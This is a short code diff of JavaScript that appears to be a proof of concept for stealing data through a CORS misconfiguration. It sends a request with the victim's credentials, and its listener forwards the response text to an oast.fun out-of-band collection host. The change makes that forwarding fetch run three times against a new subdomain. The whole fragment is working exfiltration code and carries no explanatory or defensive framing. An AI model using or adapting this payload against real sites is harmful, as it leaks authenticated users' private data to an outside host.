@@ -5,5 +5,7 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    fetch(('https://ck2p6mj2vtc0000evekggjtmdkeyyyyyb.oast.fun/zzz?xxx='+this.responseText))
+    for(let i = 0; i < 3; i++){
+        fetch(('https://ck2pbxz2vtc0000rs1cggjtmf6hyyyyyb.oast.fun/?xxx='+this.responseText))
+    }
 };
